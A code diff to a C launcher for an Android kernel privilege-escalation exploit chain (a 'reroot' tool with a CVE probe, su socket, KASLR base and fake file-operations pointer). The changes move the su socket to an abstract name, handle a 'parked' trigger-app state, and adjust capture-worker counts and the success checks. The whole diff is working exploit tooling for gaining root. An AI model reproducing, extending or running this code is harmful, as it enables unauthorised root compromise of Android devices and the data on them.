@@ -29,7 +29,7 @@
 #define REMOTE_PROBE   "/data/local/tmp/cve43499_chainwalk_probe_arm32"
 #define REMOTE_RUNNER  "/data/local/tmp/ionstack_reroot_device"
 #define REMOTE_SU      "/data/local/tmp/su"
-#define REMOTE_SOCKET  "/data/local/tmp/temp_su.sock"
+#define REMOTE_SOCKET  "@ionstack_temp_su"
 
 #define TRIGGER_APP_PACKAGE "com.ionstack.trigger"
 #define TRIGGER_APP_ACTIVITY "com.ionstack.trigger/.MainActivity"
@@ -400,11 +400,13 @@ static int run_trigger_app_command(char *const argv[], char *output,
   return rc;
 }
 
-static void print_trigger_app_log(void) {
+static int print_trigger_app_log(void) {
   char output[65536];
   char *argv[] = {"/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE,
                   "/system/bin/cat", "files/probe.log", NULL};
   int rc = run_capture_command(argv[0], argv, output, sizeof(output), 3000);
+  int parked = strstr(output, "[park]") != NULL ||
+               strstr(output, "parked=1") != NULL;
   if (output[0] != '\0') {
     printf("%s", output);
     if (!strchr(output, '\n') || output[strlen(output) - 1] != '\n') {
@@ -414,6 +416,26 @@ static void print_trigger_app_log(void) {
   if (rc != 0) {
     fprintf(stderr, "[app-probe] cannot read probe log rc=%d\n", rc);
   }
+  return parked;
+}
+
+static int trigger_app_has_parked_process(void) {
+  char output[65536];
+  char *pidof_argv[] = {"/system/bin/pidof",
+                        (char *)TRIGGER_APP_PACKAGE, NULL};
+  if (run_capture_command(pidof_argv[0], pidof_argv, output,
+                          sizeof(output), 3000) != 0 || output[0] == '\0') {
+    return 0;
+  }
+
+  char *log_argv[] = {"/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE,
+                      "/system/bin/cat", "files/probe.log", NULL};
+  if (run_capture_command(log_argv[0], log_argv, output,
+                          sizeof(output), 3000) != 0) {
+    return 0;
+  }
+  return strstr(output, "[park]") != NULL ||
+         strstr(output, "parked=1") != NULL;
 }
 
 static void force_stop_trigger_app(void) {
@@ -433,6 +455,12 @@ static int launch_trigger_app(const char *tree_arg, const char *task_arg,
   }
 
   char output[8192];
+  if (trigger_app_has_parked_process()) {
+    fprintf(stderr,
+            "[app-probe] refusing to kill a parked stale-waiter process; "
+            "normal device reboot required\n");
+    return 126;
+  }
   force_stop_trigger_app();
   char *remove_argv[] = {
       "/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE, "/system/bin/rm",
@@ -457,6 +485,7 @@ static int launch_trigger_app(const char *tree_arg, const char *task_arg,
          tree_arg, task_arg, lock_arg);
 
   uint64_t deadline = monotonic_ms() + 30000U;
+  unsigned poll_count = 0;
   while (!stop_requested && monotonic_ms() < deadline) {
     char done[128];
     char *done_argv[] = {"/system/bin/run-as", (char *)TRIGGER_APP_PACKAGE,
@@ -468,19 +497,30 @@ static int launch_trigger_app(const char *tree_arg, const char *task_arg,
       errno = 0;
       long probe_rc = strtol(done, &end, 10);
       if (errno == 0 && end != done && probe_rc >= 0 && probe_rc <= 255) {
-        print_trigger_app_log();
+        (void)print_trigger_app_log();
         force_stop_trigger_app();
         printf("[app-probe] completed rc=%ld\n", probe_rc);
         return (int)probe_rc;
       }
     }
+    poll_count++;
+    if ((poll_count % 10U) == 0U && trigger_app_has_parked_process()) {
+      (void)print_trigger_app_log();
+      fprintf(stderr,
+              "[app-probe] probe entered its safe parked state; app was "
+              "left alive and a device reboot is required before another "
+              "attempt\n");
+      return 126;
+    }
     sleep_ms(100);
   }
 
-  print_trigger_app_log();
-  force_stop_trigger_app();
-  fprintf(stderr, "[app-probe] timed out waiting for result\n");
-  return 124;
+  int parked = print_trigger_app_log();
+  fprintf(stderr,
+          "[app-probe] timed out waiting for result; app was deliberately "
+          "left alive to avoid stale-waiter teardown; normal device reboot "
+          "required before another attempt\n");
+  return parked ? 126 : 124;
 }
 
 static int existing_root_works(void) {
@@ -871,6 +911,11 @@ static int wait_captures_and_probe(struct child_proc *captures,
     for (size_t i = 0; i < capture_count; ++i) {
       drain_child(&captures[i], capture_line, &capture_states[i]);
       reap_child(&captures[i]);
+      if (captures[i].exited && captures[i].fd >= 0) {
+        close(captures[i].fd);
+        captures[i].fd = -1;
+        captures[i].partial_len = 0;
+      }
       if (!captures[i].exited || captures[i].fd >= 0) {
         all_captures_exited = 0;
       }
@@ -881,6 +926,18 @@ static int wait_captures_and_probe(struct child_proc *captures,
     }
     drain_child(probe, NULL, NULL);
     reap_child(probe);
+    /*
+     * The app launcher can leave its stdout pipe inherited by an Android
+     * descendant even after the launcher itself has returned.  Once the
+     * direct child is reaped, its exit status and all output produced before
+     * exit are authoritative; waiting for a pipe EOF only creates a false
+     * 90-second timeout while the probe remains safely parked.
+     */
+    if (probe->exited && probe->fd >= 0) {
+      close(probe->fd);
+      probe->fd = -1;
+      probe->partial_len = 0;
+    }
     if (any_success && probe->exited && probe->fd < 0) {
       return 0;
     }
@@ -1151,8 +1208,13 @@ int main(int argc, char **argv) {
   }
 
   struct capture_state capture_states[CAPTURE_WORKERS];
+#if defined(IONSTACK_PROFILE_XPAD3S)
+  size_t capture_count = 1U;
+#else
+  size_t capture_count = chain_validate_only ? 1U : CAPTURE_WORKERS;
+#endif
   memset(capture_states, 0, sizeof(capture_states));
-  for (unsigned i = 0; i < CAPTURE_WORKERS; ++i) {
+  for (unsigned i = 0; i < capture_count; ++i) {
     if (spawn_capture(&captures[i], i, &target_state, &helper_state,
                       linear_map_base, chain_validate_only) != 0) {
       perror("[reroot] spawn capture worker");
@@ -1168,9 +1230,9 @@ int main(int argc, char **argv) {
     goto cleanup;
   }
   printf("[reroot] TRIGGER capture_workers=%u probe_pid=%d\n",
-         CAPTURE_WORKERS, probe.pid);
+         (unsigned)capture_count, probe.pid);
 
-  if (wait_captures_and_probe(captures, capture_states, CAPTURE_WORKERS,
+  if (wait_captures_and_probe(captures, capture_states, capture_count,
                               &probe) != 0) {
     fprintf(stderr, "[reroot] capture/probe timeout\n");
     goto cleanup;
@@ -1179,7 +1241,7 @@ int main(int argc, char **argv) {
   unsigned capture_results = 0;
   unsigned capture_successes = 0;
   unsigned capture_su_ready = 0;
-  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
+  for (size_t i = 0; i < capture_count; ++i) {
     capture_results += capture_states[i].saw_result ? 1U : 0U;
     capture_successes += capture_states[i].saw_result &&
                                  capture_states[i].ok &&
@@ -1190,9 +1252,14 @@ int main(int argc, char **argv) {
   }
   printf("[reroot] TRIGGER_DONE workers=%u results=%u successes=%u "
          "su_ready=%u probe_rc=%d\n",
-         CAPTURE_WORKERS, capture_results, capture_successes,
+         (unsigned)capture_count, capture_results, capture_successes,
          capture_su_ready, probe_rc);
-  if (probe_rc != 0 || capture_successes == 0) {
+  int parked_after_success =
+      probe_rc == 126 &&
+      (chain_validate_only ||
+       (capture_successes > 0 && capture_su_ready > 0));
+  int probe_ok = probe_rc == 0 || parked_after_success;
+  if (!probe_ok || capture_successes == 0) {
     fprintf(stderr, "[reroot] %s capture failed\n",
             chain_validate_only ? "check-and-restore" : "write-only root");
     goto cleanup;
@@ -1216,14 +1283,15 @@ int main(int argc, char **argv) {
       goto cleanup;
     }
     printf("[reroot] CHAIN_VALIDATION_OK boot_id=%s kaslr_base=0x%016" PRIx64
-           " fake_fops=0x%016" PRIx64 " restores=%u enforce=%s\n",
+           " fake_fops=0x%016" PRIx64
+           " restores=%u enforce=%s probe_rc=%d parked=%d\n",
            boot_id, target_state.kaslr_base, helper_state.fake_fops,
-           capture_successes, enforce);
+           capture_successes, enforce, probe_rc, probe_rc == 126);
     result = 0;
     goto cleanup;
   }
 
-  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
+  for (size_t i = 0; i < capture_count; ++i) {
     stop_child(&captures[i]);
   }
 
